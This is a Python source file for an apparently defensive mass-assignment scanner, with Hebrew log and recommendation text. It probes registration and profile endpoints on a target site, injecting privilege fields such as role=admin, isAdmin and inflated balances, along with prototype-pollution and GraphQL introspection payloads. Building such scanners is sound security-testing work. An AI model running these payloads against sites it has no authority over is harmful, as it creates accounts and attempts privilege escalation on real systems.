"""
Mass Assignment Scanner
-----------------------
Detects Mass Assignment / Parameter Pollution vulnerabilities:
  - Inject hidden fields (role, isAdmin, verified, credits, balance)
  - Test PUT/PATCH endpoints for over-binding
  - Test user registration for privilege escalation
  - Test profile update for unauthorized field modification
  - API endpoint discovery for object binding
  - GraphQL introspection for field enumeration
"""

import asyncio
import json
import re
from dataclasses import dataclass, field
from typing import Optional, Callable
from urllib.parse import urlparse, urljoin

import aiohttp

# ── Data model ────────────────────────────────────────────────────────────────

@dataclass
class Finding:
    severity: str
    category: str
    title: str
    description: str
    evidence: list = field(default_factory=list)
    recommendation: str = ""
    tags: list = field(default_factory=list)

    def to_dict(self):
        return {
            "severity": self.severity,
            "category": self.category,
            "title": self.title,
            "description": self.description,
            "evidence": self.evidence,
            "recommendation": self.recommendation,
            "tags": self.tags,
        }

# ── Privilege escalation fields ────────────────────────────────────────────────

_PRIV_FIELDS = {
    # Role-based
    "role":          ["admin", "administrator", "superuser", "root", "staff", "moderator"],
    "roles":         [["admin"], ["administrator"]],
    "user_type":     ["admin", "staff", "superuser"],
    "type":          ["admin", "staff"],
    "level":         [0, 1, 99, 999],
    "tier":          ["premium", "enterprise", "vip"],
    "plan":          ["premium", "enterprise", "unlimited"],
    "subscription":  ["premium", "pro", "enterprise"],

    # Boolean flags
    "isAdmin":       [True, "true", 1],
    "is_admin":      [True, "true", 1],
    "admin":         [True, "true", 1],
    "is_staff":      [True, "true", 1],
    "staff":         [True, "true", 1],
    "is_superuser":  [True, "true", 1],
    "superuser":     [True, "true", 1],
    "is_verified":   [True, "true", 1],
    "verified":      [True, "true", 1],
    "active":        [True, "true", 1],
    "enabled":       [True, "true", 1],

    # Financial
    "credits":       [999999, 1000000],
    "balance":       [999999.99, 1000000],
    "tokens":        [999999],
    "coins":         [999999],
    "points":        [999999],
    "credit_limit":  [999999],

    # Access control
    "permissions":   [["*"], ["admin", "read", "write", "delete"]],
    "scope":         ["admin", "*", "read write delete"],
    "access_level":  [99, 100, 999],
    "group":         ["admin", "administrators", "superusers"],
    "groups":        [["admin"], ["superusers"]],
}

# ── Common API registration/profile endpoints ──────────────────────────────────

_REGISTRATION_ENDPOINTS = [
    "/api/register",
    "/api/auth/register",
    "/api/v1/register",
    "/api/v1/auth/register",
    "/api/v2/register",
    "/api/users",
    "/api/user/create",
    "/api/signup",
    "/api/auth/signup",
    "/register",
    "/signup",
    "/auth/register",
]

_PROFILE_ENDPOINTS = [
    "/api/profile",
    "/api/user/profile",
    "/api/me",
    "/api/account",
    "/api/settings",
    "/api/v1/profile",
    "/api/v1/me",
    "/api/v1/account",
    "/api/v2/profile",
    "/api/v2/me",
    "/profile",
    "/account/settings",
]

_UPDATE_METHODS = ["PUT", "PATCH"]

# ── HTTP helpers ───────────────────────────────────────────────────────────────

_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json, */*",
    "Content-Type": "application/json",
}

_TIMEOUT = aiohttp.ClientTimeout(total=12)

async def _request(session, method: str, url: str, json_body=None, headers=None, **kw):
    try:
        kw.setdefault("ssl", False)
        hdrs = {**_HEADERS, **(headers or {})}
        return await session.request(method, url, headers=hdrs, json=json_body, timeout=_TIMEOUT, **kw)
    except Exception:
        return None

async def _text(resp) -> str:
    if resp is None:
        return ""
    try:
        return await resp.text(errors="replace")
    except Exception:
        return ""

async def _json_safe(resp) -> Optional[dict]:
    if resp is None:
        return None
    try:
        return await resp.json()
    except Exception:
        return None

# ── Helpers ────────────────────────────────────────────────────────────────────

def _contains_priv_field(data: dict) -> dict:
    """Return any privilege-related keys found in a response dict."""
    found = {}
    if not isinstance(data, dict):
        return found
    for k, v in data.items():
        kl = k.lower()
        if any(p in kl for p in ["role", "admin", "staff", "verified", "permission", "scope", "level", "credit", "balance", "group"]):
            found[k] = v
    return found

def _generate_test_username() -> str:
    import uuid
    return f"test_{uuid.uuid4().hex[:8]}"

# ── Scanner ───────────────────────────────────────────────────────────────────

class MassAssignmentScanner:
    def __init__(self, url: str, cookies: str = "", auth_token: str = "", log: Optional[Callable] = None):
        self.url = url if url.startswith("http") else f"https://{url}"
        self.parsed = urlparse(self.url)
        self.base = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.cookies_str = cookies
        self.auth_token = auth_token
        self._log = log or (lambda m: None)
        self.findings: list[Finding] = []
        self._tested: set[str] = set()

    def _make_session(self) -> aiohttp.ClientSession:
        hdrs = dict(_HEADERS)
        if self.cookies_str:
            hdrs["Cookie"] = self.cookies_str
        if self.auth_token:
            hdrs["Authorization"] = f"Bearer {self.auth_token}"
        return aiohttp.ClientSession(headers=hdrs)

    def _add_priv_fields(self, base_data: dict) -> dict:
        """Inject all privilege fields into a copy of base_data."""
        enriched = dict(base_data)
        for k, values in _PRIV_FIELDS.items():
            enriched[k] = values[0]  # Use first (most impactful) value
        return enriched

    # ── Test registration endpoint ─────────────────────────────────────────────

    async def _test_registration(self, session):
        self._log("Mass Assignment: בודק רישום משתמש עם privilege fields...")
        username = _generate_test_username()
        base_payload = {
            "username": username,
            "email": f"{username}@test.com",
            "password": "TestPass123!",
            "name": "Test User",
        }
        enriched_payload = self._add_priv_fields(base_payload)

        for endpoint in _REGISTRATION_ENDPOINTS:
            url = f"{self.base}{endpoint}"
            if url in self._tested:
                continue
            self._tested.add(url)

            # First send normal registration
            normal_resp = await _request(session, "POST", url, json_body=base_payload)
            if normal_resp is None or normal_resp.status == 404:
                continue

            # Send enriched registration with privilege fields
            enrich_resp = await _request(session, "POST", url, json_body=enriched_payload)
            enrich_data = await _json_safe(enrich_resp)

            if enrich_resp and enrich_resp.status in (200, 201):
                found_priv = _contains_priv_field(enrich_data or {})
                if found_priv:
                    self._log(f"Mass Assignment קריטי: רישום עם privilege fields → {endpoint}")
                    self.findings.append(Finding(
                        severity="critical",
                        category="Mass Assignment",
                        title=f"Mass Assignment ב-Registration — {endpoint}",
                        description=f"ה-endpoint {endpoint} מקבל ושומר fields הקשורים להרשאות בזמן רישום. תוקף יכול ליצור חשבון Admin.",
                        evidence=[
                            f"Endpoint: POST {url}",
                            f"Privilege fields sent: {list(enriched_payload.keys())}",
                            f"Privilege fields in response: {found_priv}",
                            f"Full payload: {json.dumps(enriched_payload)[:300]}",
                        ],
                        recommendation="השתמש ב-allowlist של fields מותרים לרישום. מעולם אל תאפשר את כל fields של ה-Object להגדרה ע\"י המשתמש.",
                        tags=["mass-assignment", "registration", "privilege-escalation"],
                    ))
                elif enrich_resp.status in (200, 201) and not found_priv:
                    self._log(f"Mass Assignment בינוני: {endpoint} מקבל fields נוספים (לא ברור אם נשמרים)")
                    self.findings.append(Finding(
                        severity="medium",
                        category="Mass Assignment",
                        title=f"Mass Assignment חשוד — {endpoint} (requires follow-up)",
                        description=f"ה-endpoint {endpoint} מקבל payload עם privilege fields ללא שגיאה. דורש בדיקה ידנית לאימות שמירה.",
                        evidence=[
                            f"Endpoint: POST {url}",
                            f"Status: {enrich_resp.status}",
                            f"Fields sent: {list(enriched_payload.keys())}",
                        ],
                        recommendation="בדוק ב-DB שהשדות לא נשמרו. הוסף allowlist validation.",
                        tags=["mass-assignment", "registration", "suspected"],
                    ))

    # ── Test profile update ────────────────────────────────────────────────────

    async def _test_profile_update(self, session):
        self._log("Mass Assignment: בודק עדכון פרופיל עם privilege fields...")
        base_payload = {"name": "Updated Name", "bio": "test bio"}
        enriched_payload = self._add_priv_fields(base_payload)

        for endpoint in _PROFILE_ENDPOINTS:
            url = f"{self.base}{endpoint}"
            if url in self._tested:
                continue
            self._tested.add(url)

            for method in _UPDATE_METHODS:
                resp = await _request(session, method, url, json_body=enriched_payload)
                if resp is None or resp.status == 404:
                    continue

                data = await _json_safe(resp)
                found_priv = _contains_priv_field(data or {})

                if resp.status in (200, 201, 204) and found_priv:
                    self._log(f"Mass Assignment קריטי: {method} {endpoint} → privilege fields נשמרו")
                    self.findings.append(Finding(
                        severity="critical",
                        category="Mass Assignment",
                        title=f"Mass Assignment בעדכון פרופיל — {method} {endpoint}",
                        description=f"עדכון פרופיל ב-{method} {endpoint} מקבל ומחזיר privilege fields. תוקף יכול לשנות את תפקידו.",
                        evidence=[
                            f"Endpoint: {method} {url}",
                            f"Sent fields: {list(enriched_payload.keys())}",
                            f"Response privilege fields: {found_priv}",
                        ],
                        recommendation="allowlist מחמיר לכל fields בעדכון. בדוק server-side שrole/admin לא ניתנים לשינוי ע\"י המשתמש.",
                        tags=["mass-assignment", "profile-update", method.lower()],
                    ))
                    break

                if resp.status in (200, 201):
                    self._log(f"Mass Assignment חשוד: {method} {endpoint} — בדוק ידנית")
                    self.findings.append(Finding(
                        severity="low",
                        category="Mass Assignment",
                        title=f"Mass Assignment — {method} {endpoint} (בדיקה ידנית נדרשת)",
                        description=f"ה-endpoint {method} {endpoint} מקבל payload עם privilege fields. בדוק ידנית אם נשמרים.",
                        evidence=[f"Endpoint: {method} {url}", f"Status: {resp.status}"],
                        recommendation="בדוק ב-DB ובדוח API Response מלא.",
                        tags=["mass-assignment", "update", "manual-review"],
                    ))

    # ── Test admin API endpoints ───────────────────────────────────────────────

    async def _test_admin_fields_in_api(self, session):
        self._log("Mass Assignment: בודק API endpoints שמחזירים object fields...")
        api_endpoints = [
            f"{self.base}/api/me",
            f"{self.base}/api/user",
            f"{self.base}/api/v1/me",
            f"{self.base}/api/v1/user",
            f"{self.base}/api/account",
            f"{self.base}/api/profile",
        ]
        for url in api_endpoints:
            resp = await _request(session, "GET", url)
            if resp and resp.status == 200:
                data = await _json_safe(resp)
                if isinstance(data, dict):
                    found_priv = _contains_priv_field(data)
                    if found_priv:
                        self.findings.append(Finding(
                            severity="medium",
                            category="Mass Assignment",
                            title=f"API חושף Privilege Fields ב-Response — {url.replace(self.base, '')}",
                            description=f"ה-API מחזיר fields הקשורים להרשאות: {found_priv}. בדוק האם ניתן לשנותם.",
                            evidence=[
                                f"URL: {url}",
                                f"Exposed fields: {found_priv}",
                                "בדוק: שלח PUT/PATCH עם ערכים שונים לאותם fields",
                            ],
                            recommendation="הסר fields הקשורים להרשאות מה-API response אם אינם נחוצים.",
                            tags=["mass-assignment", "api-exposure", "info"],
                        ))

    # ── Test GraphQL ───────────────────────────────────────────────────────────

    async def _test_graphql(self, session):
        self._log("Mass Assignment: בודק GraphQL introspection...")
        graphql_endpoints = [
            f"{self.base}/graphql",
            f"{self.base}/api/graphql",
            f"{self.base}/gql",
        ]
        introspection_query = {"query": "{ __schema { types { name fields { name } } } }"}

        for url in graphql_endpoints:
            resp = await _request(session, "POST", url, json_body=introspection_query)
            if resp and resp.status == 200:
                data = await _json_safe(resp)
                if data and "data" in data and "__schema" in str(data):
                    # Look for privilege-related fields in schema
                    schema_str = json.dumps(data)
                    priv_in_schema = []
                    for k in ["role", "isAdmin", "admin", "permission", "credit", "balance"]:
                        if k in schema_str:
                            priv_in_schema.append(k)

                    self.findings.append(Finding(
                        severity="high" if priv_in_schema else "medium",
                        category="Mass Assignment",
                        title=f"GraphQL Introspection פעיל — {url.replace(self.base, '')}",
                        description=f"GraphQL introspection זמין ב-{url}. חושף את מבנה ה-API המלא. Fields חשובים: {priv_in_schema}",
                        evidence=[
                            f"Endpoint: {url}",
                            f"Privilege fields in schema: {priv_in_schema}",
                            "בדוק mass assignment על mutations: createUser, updateProfile",
                        ],
                        recommendation="השבת introspection ב-production. הוסף allowlist לkל mutation fields.",
                        tags=["mass-assignment", "graphql", "introspection"],
                    ))
                    return

    # ── Test nested object assignment ─────────────────────────────────────────

    async def _test_nested_assignment(self, session):
        self._log("Mass Assignment: בודק Nested Object injection...")
        nested_payloads = [
            {"name": "test", "user": {"role": "admin", "isAdmin": True}},
            {"name": "test", "profile": {"role": "admin"}},
            {"name": "test", "meta": {"role": "admin", "permissions": ["*"]}},
            {"name": "test", "__proto__": {"isAdmin": True}},  # Prototype pollution
            {"name": "test", "constructor": {"prototype": {"isAdmin": True}}},
        ]

        for endpoint in _PROFILE_ENDPOINTS[:4]:
            url = f"{self.base}{endpoint}"
            for method in ["PUT", "PATCH"]:
                for payload in nested_payloads:
                    resp = await _request(session, method, url, json_body=payload)
                    if resp and resp.status in (200, 201):
                        data = await _json_safe(resp)
                        if data and any(k in str(data).lower() for k in ["admin", "role", "permission"]):
                            self.findings.append(Finding(
                                severity="high",
                                category="Mass Assignment",
                                title=f"Nested Mass Assignment — {method} {endpoint}",
                                description=f"Nested object assignment הצליח. שלחנו object מקונן עם privilege fields.",
                                evidence=[
                                    f"Endpoint: {method} {url}",
                                    f"Payload: {json.dumps(payload)}",
                                    "Response כולל privilege data",
                                ],
                                recommendation="ולידציה רקורסיבית של כל fields nested. השתמש ב-Schema validation (Pydantic/Joi).",
                                tags=["mass-assignment", "nested", method.lower()],
                            ))
                            return

    # ── Main entry ─────────────────────────────────────────────────────────────

    async def scan(self) -> dict:
        self._log(f"Mass Assignment Scanner: מתחיל על {self.url}")
        async with self._make_session() as session:
            await asyncio.gather(
                self._test_registration(session),
                self._test_profile_update(session),
                self._test_admin_fields_in_api(session),
                self._test_graphql(session),
                self._test_nested_assignment(session),
            )

        self._log(f"Mass Assignment Scanner: הושלם — {len(self.findings)} ממצאים")
        return {
            "target": self.url,
            "total": len(self.findings),
            "critical": len([f for f in self.findings if f.severity == "critical"]),
            "findings": [f.to_dict() for f in self.findings],
        }


async def scan_mass_assignment(url: str, cookies: str = "", auth_token: str = "", log=None) -> dict:
    scanner = MassAssignmentScanner(url, cookies=cookies, auth_token=auth_token, log=log)
    return await scanner.scan()
